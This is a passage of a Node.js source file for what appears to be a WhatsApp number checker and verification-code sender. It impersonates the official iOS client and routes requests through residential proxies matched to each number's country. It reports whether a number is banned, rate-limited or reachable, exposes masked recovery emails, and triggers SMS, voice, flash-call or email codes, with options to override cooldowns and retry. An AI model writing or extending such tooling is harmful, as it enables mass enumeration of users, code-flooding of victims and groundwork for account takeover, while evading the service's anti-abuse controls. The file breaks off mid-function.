const dns = require("dns");
if (typeof dns.setDefaultResultOrder === "function") dns.setDefaultResultOrder("ipv4first");
const WADetector = require("./walz-loader");

const DEFAULT_TIMEOUT_MS = parseInt(process.env.WA_TIMEOUT_MS || "25000", 10);

function extractCountryCallingCode(phone) {
  const digits = String(phone || "").replace(/\D/g, "");
  if (!digits) return "";
  // longest match first (3, then 2, then 1)
  const cc3 = ["212","213","216","218","220","221","222","223","224","225","226","227","228","229","230","231","232","233","234","235","236","237","238","239","240","241","242","243","244","245","248","249","250","251","252","253","254","255","256","257","258","260","261","262","263","264","265","266","267","268","269","290","291","297","298","299","350","351","352","353","354","355","356","357","358","359","370","371","372","373","374","375","376","377","378","380","381","382","383","385","386","387","389","420","421","423","500","501","502","503","504","505","506","507","508","509","590","591","592","593","595","596","597","598","599","670","672","673","674","675","676","677","678","679","680","681","682","683","685","686","687","688","689","690","691","692","850","852","853","855","856","880","886","960","961","962","963","964","965","966","967","968","970","971","972","973","974","975","976","977","992","993","994","995","996","998"];
  const cc2 = ["20","27","30","31","32","33","34","36","39","40","41","43","44","45","46","47","48","49","51","52","53","54","55","56","57","58","60","61","62","63","64","65","66","81","82","84","86","90","91","92","93","94","95","98"];
  for (const c of cc3) {
    if (digits.startsWith(c)) return c;
  }
  for (const c of cc2) {
    if (digits.startsWith(c)) return c;
  }
  if (digits.startsWith("1")) return "1";
  if (digits.startsWith("7")) return "7";
  return "";
}

// DataImpulse __cr.XX codes (ISO-ish short)
const CC_TO_PROXY_COUNTRY = {
  "1": "us",
  "7": "ru",
  "20": "eg",
  "27": "za",
  "30": "gr",
  "31": "nl",
  "32": "be",
  "33": "fr",
  "34": "es",
  "36": "hu",
  "39": "it",
  "40": "ro",
  "41": "ch",
  "43": "at",
  "44": "gb",
  "45": "dk",
  "46": "se",
  "47": "no",
  "48": "pl",
  "49": "de",
  "51": "pe",
  "52": "mx",
  "53": "cu",
  "54": "ar",
  "55": "br",
  "56": "cl",
  "57": "co",
  "58": "ve",
  "60": "my",
  "61": "au",
  "62": "id",
  "63": "ph",
  "64": "nz",
  "65": "sg",
  "66": "th",
  "81": "jp",
  "82": "kr",
  "84": "vn",
  "86": "cn",
  "90": "tr",
  "91": "in",
  "92": "pk",
  "93": "af",
  "94": "lk",
  "95": "mm",
  "98": "ir",
  "212": "ma",
  "213": "dz",
  "216": "tn",
  "218": "ly",
  "220": "gm",
  "221": "sn",
  "223": "ml",
  "224": "gn",
  "225": "ci",
  "226": "bf",
  "227": "ne",
  "228": "tg",
  "229": "bj",
  "230": "mu",
  "231": "lr",
  "232": "sl",
  "233": "gh",
  "234": "ng",
  "235": "td",
  "236": "cf",
  "237": "cm",
  "238": "cv",
  "240": "gq",
  "241": "ga",
  "242": "cg",
  "243": "cd",
  "244": "ao",
  "248": "sc",
  "249": "sd",
  "250": "rw",
  "251": "et",
  "252": "so",
  "253": "dj",
  "254": "ke",
  "255": "tz",
  "256": "ug",
  "257": "bi",
  "258": "mz",
  "260": "zm",
  "261": "mg",
  "262": "re",
  "263": "zw",
  "264": "na",
  "265": "mw",
  "266": "ls",
  "267": "bw",
  "268": "sz",
  "269": "km",
  "351": "pt",
  "352": "lu",
  "353": "ie",
  "354": "is",
  "355": "al",
  "356": "mt",
  "357": "cy",
  "358": "fi",
  "359": "bg",
  "370": "lt",
  "371": "lv",
  "372": "ee",
  "373": "md",
  "374": "am",
  "375": "by",
  "376": "ad",
  "377": "mc",
  "378": "sm",
  "380": "ua",
  "381": "rs",
  "382": "me",
  "383": "xk",
  "385": "hr",
  "386": "si",
  "387": "ba",
  "389": "mk",
  "420": "cz",
  "421": "sk",
  "423": "li",
  "501": "bz",
  "502": "gt",
  "503": "sv",
  "504": "hn",
  "505": "ni",
  "506": "cr",
  "507": "pa",
  "509": "ht",
  "591": "bo",
  "592": "gy",
  "593": "ec",
  "595": "py",
  "598": "uy",
  "670": "tl",
  "673": "bn",
  "674": "nr",
  "675": "pg",
  "676": "to",
  "677": "sb",
  "678": "vu",
  "679": "fj",
  "680": "pw",
  "685": "ws",
  "686": "ki",
  "852": "hk",
  "853": "mo",
  "855": "kh",
  "856": "la",
  "880": "bd",
  "886": "tw",
  "960": "mv",
  "961": "lb",
  "962": "jo",
  "963": "sy",
  "964": "iq",
  "965": "kw",
  "966": "sa",
  "967": "ye",
  "968": "om",
  "970": "ps",
  "971": "ae",
  "972": "il",
  "973": "bh",
  "974": "qa",
  "975": "bt",
  "976": "mn",
  "977": "np",
  "992": "tj",
  "993": "tm",
  "994": "az",
  "995": "ge",
  "996": "kg",
  "998": "uz"
};

const PROXY_AUTO_COUNTRY = String(process.env.PROXY_AUTO_COUNTRY || "1").trim() !== "0";
const PROXY_DEFAULT_COUNTRY = String(process.env.PROXY_COUNTRY || process.env.DATAIMPULSE_COUNTRY || "").trim().toLowerCase();

function getProxyBaseCredentials() {
  if (process.env.PROXY_URL) {
    try {
      const u = new URL(process.env.PROXY_URL);
      return {
        proto: (u.protocol || "http:").replace(":", ""),
        host: u.hostname,
        port: u.port || "823",
        user: decodeURIComponent(u.username || ""),
        pass: decodeURIComponent(u.password || ""),
        fromUrl: true
      };
    } catch (_) {}
  }
  const host = process.env.PROXY_HOST || process.env.DATAIMPULSE_HOST || "";
  const port = process.env.PROXY_PORT || process.env.DATAIMPULSE_PORT || "";
  const user = process.env.PROXY_USER || process.env.DATAIMPULSE_USER || "";
  const pass = process.env.PROXY_PASS || process.env.DATAIMPULSE_PASS || "";
  const proto = (process.env.PROXY_PROTOCOL || "http").toLowerCase().replace("https", "http");
  if (!host || !port) return null;
  return { proto, host, port, user, pass, fromUrl: false };
}

function stripCrSuffix(user) {
  if (!user) return "";
  // remove existing __cr.xx or ;sessid...
  return String(user).split("__cr.")[0].split(";")[0];
}

function buildProxyUrlForCountry(countryCode) {
  const base = getProxyBaseCredentials();
  if (!base || !base.host) return "";
  let user = stripCrSuffix(base.user);
  const pass = base.pass || "";
  const cr = String(countryCode || PROXY_DEFAULT_COUNTRY || "").trim().toLowerCase();
  if (cr && user) {
    user = user + "__cr." + cr;
  }
  const auth = user ? encodeURIComponent(user) + ":" + encodeURIComponent(pass) + "@" : "";
  const proto = (base.proto || "http").replace("https", "http");
  return proto + "://" + auth + base.host + ":" + base.port;
}

function resolveProxyCountryForPhone(phone) {
  if (!PROXY_AUTO_COUNTRY) {
    return PROXY_DEFAULT_COUNTRY || "";
  }
  const cc = extractCountryCallingCode(phone);
  if (cc && CC_TO_PROXY_COUNTRY[cc]) {
    return CC_TO_PROXY_COUNTRY[cc];
  }
  return PROXY_DEFAULT_COUNTRY || "";
}

const dispatcherCache = new Map();
let defaultDispatcher = null;

function createProxyDispatcher(proxyUrl) {
  const undici = require("undici");
  if (proxyUrl && undici.ProxyAgent) {
    return new undici.ProxyAgent({
      uri: proxyUrl,
      connections: 12,
      pipelining: 1,
      keepAliveTimeout: 30000,
      keepAliveMaxTimeout: 60000,
      connect: { timeout: 12000, rejectUnauthorized: true },
      bodyTimeout: 25000,
      headersTimeout: 20000,
      requestTls: { rejectUnauthorized: true },
      proxyTls: { rejectUnauthorized: true }
    });
  }
  return new undici.Agent({
    connections: 64,
    pipelining: 1,
    keepAliveTimeout: 30000,
    keepAliveMaxTimeout: 60000,
    connect: { timeout: 8000, rejectUnauthorized: true },
    bodyTimeout: 20000,
    headersTimeout: 15000
  });
}

function getDispatcherForPhone(phone) {
  try {
    const country = resolveProxyCountryForPhone(phone);
    const cacheKey = country || "__default__";
    if (dispatcherCache.has(cacheKey)) {
      return { dispatcher: dispatcherCache.get(cacheKey), country };
    }
    const proxyUrl = buildProxyUrlForCountry(country);
    if (!proxyUrl && !defaultDispatcher) {
      defaultDispatcher = createProxyDispatcher("");
      console.log("[checker] proxy disabled (set PROXY_URL or PROXY_HOST/PORT)");
      dispatcherCache.set(cacheKey, defaultDispatcher);
      return { dispatcher: defaultDispatcher, country: "" };
    }
    if (!proxyUrl) {
      if (!defaultDispatcher) defaultDispatcher = createProxyDispatcher("");
      return { dispatcher: defaultDispatcher, country: "" };
    }
    const d = createProxyDispatcher(proxyUrl);
    dispatcherCache.set(cacheKey, d);
    if (dispatcherCache.size === 1) {
      console.log("[checker] proxy auto-country:", proxyUrl.replace(/:[^:@/]+@/, ":****@"));
    }
    return { dispatcher: d, country };
  } catch (e) {
    console.warn("[checker] dispatcher resolve failed:", e && e.message ? e.message : e);
    if (!defaultDispatcher) {
      try { defaultDispatcher = createProxyDispatcher(""); } catch (_) {}
    }
    return { dispatcher: defaultDispatcher, country: "" };
  }
}

// backward compat
function buildProxyUrlFromEnv() {
  return buildProxyUrlForCountry(PROXY_DEFAULT_COUNTRY);
}

const PROXY_URL = buildProxyUrlFromEnv();
let keepAliveDispatcher;
try {
  const resolved = getDispatcherForPhone("");
  keepAliveDispatcher = resolved.dispatcher;
} catch (e) {
  console.warn("[checker] dispatcher init failed:", e && e.message ? e.message : e);
}

function sanitizePhoneInput(raw) {
  const cleaned = String(raw || "")
    .replace(/[\u200B-\u200F\u202A-\u202E\uFEFF]/g, "")
    .trim();
  const hasPlus = cleaned.startsWith("+");
  let digits = cleaned.replace(/\D/g, "");
  if (!digits) return cleaned;
  if (!hasPlus && digits.startsWith("00") && digits.length >= 9) digits = digits.slice(2);
  if (!hasPlus && digits.startsWith("0") && digits.length >= 9 && digits.length <= 14) {
    digits = "62" + digits.slice(1);
  }
  if (digits.length < 7 || digits.length > 15) return cleaned.startsWith("+") ? cleaned : "+" + digits;
  return "+" + digits;
}

function safeJsonParse(rawText) {
  if (!rawText || typeof rawText !== "string") return null;
  const cleaned = rawText.replace(/^\s*(?:for\s*\(\s*;\s*;\s*\)\s*;|\)\]\}'\s*,?)/, "").trim();
  if (!cleaned || (!cleaned.startsWith("{") && !cleaned.startsWith("["))) return null;
  try {
    return JSON.parse(cleaned);
  } catch (_) {
    return null;
  }
}

function parseBoolFlag(val) {
  if (typeof val === "boolean") return val;
  if (typeof val === "number") return val === 1;
  if (typeof val === "string") {
    const s = val.trim().toLowerCase();
    return s === "true" || s === "1" || s === "yes" || s === "on" || s === "active" || s === "registered";
  }
  return null;
}

function extractDeviceState(result, existJson, codeJson) {
  const candidates = [
    result && result.isDeviceOn,
    result && result.hasDevice,
    result && result.waOld,
    result && result.wa_old,
    result && result.raw && result.raw.wa_old,
    result && result.raw && result.raw.has_device,
    existJson && existJson.wa_old,
    existJson && existJson.has_device,
    existJson && existJson.registered,
    codeJson && codeJson.wa_old,
    codeJson && codeJson.has_device
  ];
  for (const c of candidates) {
    const parsed = parseBoolFlag(c);
    if (parsed !== null) return parsed;
  }
  return false;
}

function inferFromRawJson(phone, existJson, codeJson, parsed) {
  const primary = codeJson || existJson;
  if (!primary || typeof primary !== "object") return null;

  const status = String(primary.status || "").toLowerCase();
  const reason = String(primary.reason || (existJson && existJson.reason) || "").toLowerCase();
  const rawCooldown = Number(
    primary.retry_after ?? primary.sms_wait ?? primary.voice_wait ?? primary.wait ??
    (existJson && (existJson.retry_after ?? existJson.sms_wait)) ?? 0
  );
  const cooldownSeconds = Number.isFinite(rawCooldown) && rawCooldown > 0 ? Math.floor(rawCooldown) : 0;
  const deviceOn = extractDeviceState(parsed, existJson, codeJson);

  if (
    reason === "blocked" ||
    reason === "banned" ||
    (existJson && ["blocked", "banned"].includes(String(existJson.reason || "").toLowerCase()))
  ) {
    return {
      success: true,
      phone,
      state: "BANNED",
      isReady: false,
      isCooldown: false,
      isCloneBlocked: false,
      isBanned: true,
      cooldownSeconds: 0,
      wa_old: deviceOn,
      isDeviceOn: deviceOn,
      hasDevice: deviceOn
    };
  }

  if (reason === "length_long" || reason === "length_short" || reason === "missing" || reason === "invalid_smax") {
    return { success: false, phone, state: "INVALID_NUMBER", error: reason };
  }

  if (["no_routes", "old_version", "bad_token", "security_block", "unofficial_app", "device_confirm"].includes(reason)) {
    return {
      success: true,
      phone,
      state: "CLONE_BLOCKED",
      isReady: false,
      isCooldown: cooldownSeconds > 0,
      isCloneBlocked: true,
      isBanned: false,
      cooldownSeconds,
      wa_old: deviceOn,
      isDeviceOn: deviceOn,
      hasDevice: deviceOn
    };
  }

  const hardCooldownReasons = ["too_recent", "too_many", "too_many_guesses", "try_again", "next_method", "temporarily_unavailable", "rate_overlimit"];
  const readyReasons = ["incorrect", "sent", "sms_sent", "code_sent", "ok", ""];

  if (hardCooldownReasons.includes(reason) || (cooldownSeconds >= 600 && status !== "ok")) {
    return {
      success: true,
      phone,
      state: "COOLDOWN",
      isReady: false,
      isCooldown: true,
      isCloneBlocked: false,
      isBanned: false,
      cooldownSeconds,
      wa_old: deviceOn,
      isDeviceOn: deviceOn,
      hasDevice: deviceOn
    };
  }

  if (status === "ok" || readyReasons.includes(reason) || (cooldownSeconds > 0 && cooldownSeconds < 600 && !hardCooldownReasons.includes(reason))) {
    return {
      success: true,
      phone,
      state: "READY",
      isReady: true,
      isCooldown: false,
      isCloneBlocked: false,
      isBanned: false,
      cooldownSeconds: 0,
      wa_old: deviceOn,
      isDeviceOn: deviceOn,
      hasDevice: deviceOn
    };
  }

  return null;
}

function numWait(v) {
  const n = Number(v);
  return Number.isFinite(n) && n > 0 ? Math.floor(n) : 0;
}

function extractMethodWaits(parsed, existJson, codeJson) {
  const cd = (parsed && parsed.cooldowns) || {};
  const pick = (obj, keys) => {
    for (const k of keys) {
      if (obj && obj[k] != null) {
        if (typeof obj[k] === "object" && obj[k].seconds != null) return numWait(obj[k].seconds);
        return numWait(obj[k]);
      }
    }
    return 0;
  };
  return {
    sms: pick(cd, ["sms"]) || pick(codeJson || {}, ["sms_wait", "retry_after", "wait"]) || pick(existJson || {}, ["sms_wait", "retry_after"]),
    voice: pick(cd, ["voice"]) || pick(codeJson || {}, ["voice_wait"]) || pick(existJson || {}, ["voice_wait"]),
    flash: pick(cd, ["flash"]) || pick(codeJson || {}, ["flash_wait", "flash_type"]) || 0,
    wa_old: pick(cd, ["wa_old_device", "wa_old"]) || pick(codeJson || {}, ["wa_old_wait"]) || 0,
    email: pick(cd, ["email_otp", "email"]) || pick(codeJson || {}, ["email_wait", "email_retry_after"]) || pick(existJson || {}, ["email_wait", "email_retry_after"])
  };
}

function normalizeResult(phone, parsed, existText, codeText) {
  const existJson = safeJsonParse(existText);
  const codeJson = safeJsonParse(codeText);

  if (!parsed || typeof parsed !== "object") {
    const recovered = inferFromRawJson(phone, existJson, codeJson, null);
    return recovered || { success: false, phone, error: "empty_parser_response" };
  }

  if (!parsed.success) {
    const recovered = inferFromRawJson(parsed.phone || phone, existJson, codeJson, parsed);
    if (recovered) return recovered;
    const rawReason = (codeJson && codeJson.reason) || (existJson && existJson.reason) || "";
    return {
      success: false,
      phone: parsed.phone || phone,
      state: parsed.state || undefined,
      error: parsed.error || parsed.description || rawReason || "detection_failed"
    };
  }

  const codeReason = String((codeJson && codeJson.reason) || (existJson && existJson.reason) || parsed.reason || "").toLowerCase();
  const codeStatus = String((codeJson && codeJson.status) || (existJson && existJson.status) || "").toLowerCase();
  const methods = extractMethodWaits(parsed, existJson, codeJson);
  const primaryWait = methods.sms || methods.voice || methods.email || methods.wa_old || methods.flash || 0;

  const hardCooldownReasons = [
    "too_recent", "too_many", "too_many_guesses", "try_again", "next_method",
    "temporarily_unavailable", "rate_overlimit", "no_routes"
  ];
  const concurrentReasons = ["guessed_too_fast", "wrong_code", "stale_code", "code_mismatch"];
  const isConcurrent = concurrentReasons.includes(codeReason) || Boolean(parsed.isConcurrent);
  const isHardCooldown = hardCooldownReasons.includes(codeReason) || primaryWait > 0;

  let isBanned = Boolean(parsed.isBanned);
  let isCloneBlocked = Boolean(parsed.isCloneBlocked);
  const baseReady = Boolean(parsed.isReady) || codeStatus === "ok" || ["incorrect", "sent", "sms_sent", "code_sent"].includes(codeReason);

  let isReady = false;
  let isCooldown = false;
  let isSmsLimited = false;
  let isInUse = false;
  let cooldownSeconds = primaryWait;
  let state = "UNKNOWN";

  if (isBanned) {
    state = "BANNED";
  } else if (isCloneBlocked) {
    state = "CLONE_BLOCKED";
  } else if (isConcurrent && primaryWait === 0) {
    isInUse = true;
    isReady = false;
    state = "IN_USE";
  } else if (isHardCooldown || primaryWait > 0) {
    isCooldown = true;
    isReady = false;
    state = "COOLDOWN";
    cooldownSeconds = primaryWait > 0 ? primaryWait : Math.max(cooldownSeconds, 60);
  } else if (baseReady) {
    isReady = true;
    cooldownSeconds = 0;
    state = "READY";
  } else {
    isReady = false;
    state = "UNKNOWN";
  }

  const deviceOn = extractDeviceState(parsed, existJson, codeJson);
  const availableMethods = [];
  if (methods.sms === 0 && !isBanned && !isCloneBlocked) availableMethods.push("sms");
  if (methods.voice === 0 && !isBanned && !isCloneBlocked) availableMethods.push("voice");
  if (methods.flash === 0 && !isBanned && !isCloneBlocked) availableMethods.push("flash");
  if (methods.wa_old === 0 && deviceOn && !isBanned) availableMethods.push("wa_old");
  if (methods.email === 0 && !isBanned && !isCloneBlocked) availableMethods.push("email");

  return {
    ...parsed,
    success: true,
    phone: parsed.phone || phone,
    state,
    isReady,
    isCooldown,
    isSmsLimited,
    isInUse,
    isCloneBlocked,
    isBanned,
    cooldownSeconds: isCooldown || isSmsLimited || isInUse ? cooldownSeconds : 0,
    methods,
    availableMethods,
    wa_old: deviceOn,
    isDeviceOn: deviceOn,
    hasDevice: deviceOn
  };
}

function normalizeEmailResult(phone, parsed, existText, codeText) {
  const existJson = safeJsonParse(existText);
  const codeJson = safeJsonParse(codeText);

  if ((!parsed || typeof parsed !== "object" || !parsed.success) && !existJson && !codeJson) {
    return {
      success: false,
      phone: (parsed && parsed.phone) || phone,
      error: (parsed && (parsed.error || parsed.description)) || "email_check_failed"
    };
  }

  const safeParsed = parsed && typeof parsed === "object" ? parsed : {};
  const deviceOn = extractDeviceState(safeParsed, existJson, codeJson);
  const isBanned = Boolean(
    safeParsed.isBanned ||
    safeParsed.emailStatus === "BANNED" ||
    (existJson && existJson.reason === "blocked") ||
    (codeJson && codeJson.reason === "blocked")
  );

  const maskedEmail =
    safeParsed.maskedEmail ||
    safeParsed.email ||
    (codeJson && (codeJson.email || codeJson.email_address || codeJson.masked_email)) ||
    (existJson && (existJson.email || existJson.email_address || existJson.masked_email)) ||
    null;

  const rawWait = Number(
    safeParsed.emailWaitSeconds ??
    (codeJson && (codeJson.email_wait ?? codeJson.email_retry_after)) ??
    (existJson && (existJson.email_wait ?? existJson.email_retry_after)) ??
    0
  );
  const emailWaitSeconds = Number.isFinite(rawWait) && rawWait > 0 ? Math.floor(rawWait) : 0;

  const eligibleFlag = parseBoolFlag(
    safeParsed.emailEligible ??
    safeParsed.email_otp_eligible ??
    (codeJson && (codeJson.email_otp_eligible ?? codeJson.email_eligible ?? codeJson.can_send_email)) ??
    (existJson && (existJson.email_otp_eligible ?? existJson.email_eligible ?? existJson.can_send_email))
  );

  let emailStatus = String(safeParsed.emailStatus || "").toUpperCase();
  if (isBanned) {
    emailStatus = "BANNED";
  } else if (emailStatus !== "ELIGIBLE" && emailStatus !== "WAIT" && emailStatus !== "UNAVAILABLE") {
    if (emailWaitSeconds > 0) {
      emailStatus = "WAIT";
    } else if (eligibleFlag === true || Boolean(maskedEmail)) {
      emailStatus = "ELIGIBLE";
    } else {
      emailStatus = "UNAVAILABLE";
    }
  }

  return {
    ...safeParsed,
    success: true,
    phone: safeParsed.phone || phone,
    state: emailStatus,
    emailStatus,
    maskedEmail: maskedEmail ? String(maskedEmail) : null,
    emailWaitSeconds,
    wa_old: deviceOn,
    isDeviceOn: deviceOn,
    hasDevice: deviceOn
  };
}

async function callWA(reqObj, userAgent, sharedHeaders = null, timeoutMs = DEFAULT_TIMEOUT_MS, externalSignal = null, phoneForProxy = null) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  const onExternalAbort = () => controller.abort();
  if (externalSignal) {
    if (externalSignal.aborted) {
      clearTimeout(timer);
      throw new Error("CANCELLED");
    }
    externalSignal.addEventListener("abort", onExternalAbort, { once: true });
  }
  try {
    const method = String((reqObj && reqObj.method) || "POST").toUpperCase();
    const options = {
      method,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": userAgent || "WhatsApp/2.26.42.77 iOS/17.4 Device/iPhone_15_Pro",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        ...(sharedHeaders || {}),
        ...((reqObj && reqObj.headers) || {})
      },
      signal: controller.signal
    };
    if (method !== "GET" && method !== "HEAD" && reqObj && reqObj.body !== undefined) {
      options.body = reqObj.body;
    }
    const resolved = phoneForProxy
      ? getDispatcherForPhone(phoneForProxy)
      : { dispatcher: keepAliveDispatcher };
    if (resolved.dispatcher) options.dispatcher = resolved.dispatcher;

    const res = await fetch(reqObj.url, options);
    if (res.status === 429) {
      throw new Error("HTTP_429_RATE_LIMIT");
    }
    if (res.status >= 500) {
      throw new Error(`HTTP_${res.status}_SERVER_ERROR`);
    }
    if (res.status === 403 || res.status === 401) {
      throw new Error(`HTTP_${res.status}_FORBIDDEN`);
    }
    const text = await res.text();
    if (!text || !text.trim()) {
      throw new Error(`EMPTY_UPSTREAM_HTTP_${res.status}`);
    }
    return text;
  } catch (e) {
    if (e && e.name === "AbortError") {
      if (externalSignal && externalSignal.aborted) throw new Error("CANCELLED");
      throw new Error("REQUEST_TIMEOUT");
    }
    const msg = String(e && e.message ? e.message : e);
    if (msg === "CANCELLED") throw e;
    if (/ECONNRESET|ECONNREFUSED|ETIMEDOUT|ENOTFOUND|UND_ERR|fetch failed|socket hang up|network/i.test(msg)) {
      throw new Error("NETWORK_ERROR");
    }
    throw e;
  } finally {
    clearTimeout(timer);
    if (externalSignal) externalSignal.removeEventListener("abort", onExternalAbort);
  }
}

async function checkPhone(rawPhone) {
  const cleanPhone = sanitizePhoneInput(rawPhone);
  try {
    const payload = await WADetector.buildDualPayloads(cleanPhone);
    if (!payload || !payload.success) {
      return {
        success: false,
        phone: cleanPhone,
        state: "INVALID_NUMBER",
        error: (payload && payload.error) || "invalid_phone"
      };
    }

    const formattedPhone = `+${payload.phoneInfo.full}`;
    let existText = "";
    let codeText = "";

    try {
      existText = await callWA(payload.exist, payload.userAgent, payload.headers, DEFAULT_TIMEOUT_MS, null, cleanPhone);
    } catch (e1) {
      throw e1;
    }

    try {
      await new Promise(r => setTimeout(r, 5));
      codeText = await callWA(payload.code, payload.userAgent, payload.headers, DEFAULT_TIMEOUT_MS, null, cleanPhone);
    } catch (_) {}

    const parsed = WADetector.parseDualResponse(payload.phoneInfo, existText, codeText || null);
    let normalized = normalizeResult(formattedPhone, parsed, existText, codeText || null);

    const codeJson = safeJsonParse(codeText || "") || {};
    const codeReason = String(codeJson.reason || "").toLowerCase();
    if (
      normalized &&
      normalized.success &&
      (normalized.isInUse || ["guessed_too_fast", "wrong_code", "stale_code"].includes(codeReason))
    ) {
      try {
        await new Promise(r => setTimeout(r, 300));
        const exist2 = await callWA(payload.exist, payload.userAgent, payload.headers, DEFAULT_TIMEOUT_MS, null, cleanPhone);
        const parsed2 = WADetector.parseDualResponse(payload.phoneInfo, exist2, codeText || null);
        const normalized2 = normalizeResult(formattedPhone, parsed2, exist2, codeText || null);
        if (normalized2 && normalized2.success) {
          normalized2.isInUse = true;
          if (normalized2.state === "READY") {
            normalized2.state = "IN_USE";
            normalized2.isReady = false;
          }
          normalized = normalized2;
        }
      } catch (_) {}
    }

    return normalized;
  } catch (e) {
    return {
      success: false,
      phone: cleanPhone,
      error: String(e && e.message ? e.message : e)
    };
  }
}

async function triggerEmailVerification(rawPhone) {
  const cleanPhone = sanitizePhoneInput(rawPhone);
  try {
    const buildFn = typeof WADetector.buildEmailPayloads === "function"
      ? WADetector.buildEmailPayloads.bind(WADetector)
      : WADetector.buildDualPayloads.bind(WADetector);

    const payload = await buildFn(cleanPhone);
    if (!payload || !payload.success) {
      return {
        success: false,
        phone: cleanPhone,
        state: "INVALID_NUMBER",
        error: (payload && payload.error) || "invalid_phone"
      };
    }

    const formattedPhone = `+${payload.phoneInfo.full}`;
    let existText = "";
    let codeText = "";

    if (payload.exist) {
      try { existText = await callWA(payload.exist, payload.userAgent, payload.headers, DEFAULT_TIMEOUT_MS, null, cleanPhone); } catch (_) {}
    }
    if (payload.code) {
      try {
        if (existText) await new Promise(r => setTimeout(r, 5));
        codeText = await callWA(payload.code, payload.userAgent, payload.headers, DEFAULT_TIMEOUT_MS, null, cleanPhone);
      } catch (_) {}
    }
    if (payload.email) {
      try {
        if (existText || codeText) await new Promise(r => setTimeout(r, 5));
        const emailResp = await callWA(payload.email, payload.userAgent, payload.headers, DEFAULT_TIMEOUT_MS, null, cleanPhone);
        codeText = emailResp || codeText;
      } catch (_) {}
    }

    if (!existText && !codeText) {
      return { success: false, phone: cleanPhone, error: "REQUEST_TIMEOUT" };
    }

    const parsed = typeof WADetector.parseEmailResponse === "function"
      ? WADetector.parseEmailResponse(payload.phoneInfo, existText, codeText)
      : WADetector.parseDualResponse(payload.phoneInfo, existText, codeText);

    return normalizeEmailResult(formattedPhone, parsed, existText, codeText);
  } catch (e) {
    return {
      success: false,
      phone: cleanPhone,
      error: String(e && e.message ? e.message : e)
    };
  }
}

async function probePhoneMethods(rawPhone) {
  const checked = await checkPhone(rawPhone);
  if (!checked || !checked.success) {
    return {
      success: false,
      phone: (checked && checked.phone) || rawPhone,
      error: (checked && checked.error) || "probe_failed",
      methods: { sms: 0, voice: 0, flash: 0, wa_old: 0, email: 0 },
      availableMethods: [],
      state: (checked && checked.state) || "ERROR",
      isDeviceOn: false
    };
  }
  return {
    success: true,
    phone: checked.phone,
    state: checked.state,
    isReady: checked.isReady,
    isCooldown: checked.isCooldown,
    isSmsLimited: checked.isSmsLimited,
    isBanned: checked.isBanned,
    isCloneBlocked: checked.isCloneBlocked,
    cooldownSeconds: checked.cooldownSeconds || 0,
    methods: checked.methods || { sms: 0, voice: 0, flash: 0, wa_old: 0, email: 0 },
    availableMethods: checked.availableMethods || [],
    isDeviceOn: Boolean(checked.isDeviceOn || checked.wa_old),
    maskedEmail: checked.maskedEmail || null
  };
}

async function callWAWithRetry(reqObj, userAgent, sharedHeaders, timeoutMs, retries = 2, externalSignal = null, phoneForProxy = null) {
  let lastErr = null;
  for (let i = 0; i <= retries; i++) {
    if (externalSignal && externalSignal.aborted) throw new Error("CANCELLED");
    try {
      return await callWA(reqObj, userAgent, sharedHeaders, timeoutMs, externalSignal, phoneForProxy);
    } catch (e) {
      lastErr = e;
      const msg = String(e && e.message ? e.message : e);
      if (msg === "CANCELLED") throw e;
      if (!/NETWORK_ERROR|REQUEST_TIMEOUT|HTTP_5|EMPTY_UPSTREAM|HTTP_429/i.test(msg)) break;
      if (i < retries) await new Promise(r => setTimeout(r, 500 + i * 600));
    }
  }
  throw lastErr;
}

async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
  const cleanPhone = sanitizePhoneInput(rawPhone);
  const allowed = new Set(["sms", "voice", "flash", "email", "wa_old"]);
  const methodKey = allowed.has(String(method || "").toLowerCase()) ? String(method).toLowerCase() : "sms";
  const skipProbe = Boolean(options.skipProbe);
  const signal = options.signal || null;
  const sendTimeout = parseInt(process.env.WA_SEND_TIMEOUT_MS || "28000", 10);

  const assertNotCancelled = () => {
    if (signal && signal.aborted) throw new Error("CANCELLED");
  };

  try {
    assertNotCancelled();
    let probe = options.probe || null;
    // skipProbe default recommended for temporary loop (hindari double request)
    if (!skipProbe && !probe) {
      try {
        probe = await probePhoneMethods(cleanPhone);
      } catch (pe) {
        probe = { success: false, phone: cleanPhone, error: String(pe && pe.message ? pe.message : pe) };
      }
      assertNotCancelled();
    }

    if (probe && probe.isBanned) {
      return { success: false, phone: probe.phone || cleanPhone, method: methodKey, state: "BANNED", error: "banned", probe, cooldownSeconds: 0 };
    }

    // Probe gagal/timeout: tetap lanjut kirim OTP (force)
    if (probe && !probe.success && !options.forceSend && !options.ignoreCooldown) {
      const pe = String(probe.error || "");
      if (!/TIMEOUT|NETWORK|HTTP_5|EMPTY/i.test(pe)) {
        return { success: false, phone: probe.phone || cleanPhone, method: methodKey, error: probe.error || "probe_failed", probe };
      }
    }

    if (probe && probe.methods && !options.ignoreCooldown) {
      const waitForMethod = numWait(probe.methods[methodKey]);
      if (waitForMethod > 0) {
        return {
          success: false,
          phone: probe.phone || cleanPhone,
          method: methodKey,
          state: waitForMethod >= 600 ? "COOLDOWN" : "SMS_LIMIT",
          error: "method_cooldown",
          cooldownSeconds: waitForMethod,
          methods: probe.methods,
          isDeviceOn: probe.isDeviceOn,
          probe
        };
      }
    }

    assertNotCancelled();
    const payload = await WADetector.buildDualPayloads(cleanPhone, methodKey);
    if (!payload || !payload.success) {
      return {
        success: false,
        phone: cleanPhone,
        method: methodKey,
        error: (payload && payload.error) || "invalid_phone",
        probe
      };
    }

    const formattedPhone = `+${payload.phoneInfo.full}`;
    let existText = "";
    let codeText = "";
    let registerText = "";

    if (payload.exist) {
      try {
        existText = await callWAWithRetry(payload.exist, payload.userAgent, payload.headers, sendTimeout, 1, signal, cleanPhone);
      } catch (e) {
        const em = String(e && e.message ? e.message : e);
        if (em === "CANCELLED") {
          return { success: false, phone: formattedPhone, method: methodKey, error: "CANCELLED", probe };
        }
        // lanjut ke /v2/code meski exist gagal jaringan
      }
    }

    assertNotCancelled();
    const req = payload.code || null;
    if (!req) {
      return { success: false, phone: formattedPhone, method: methodKey, error: "no_code_endpoint", probe };
    }

    try {
      if (existText) await new Promise(r => setTimeout(r, 30));
      assertNotCancelled();
      codeText = await callWAWithRetry(req, payload.userAgent, payload.headers, sendTimeout, 1, signal, cleanPhone);
    } catch (e) {
      return {
        success: false,
        phone: formattedPhone,
        method: methodKey,
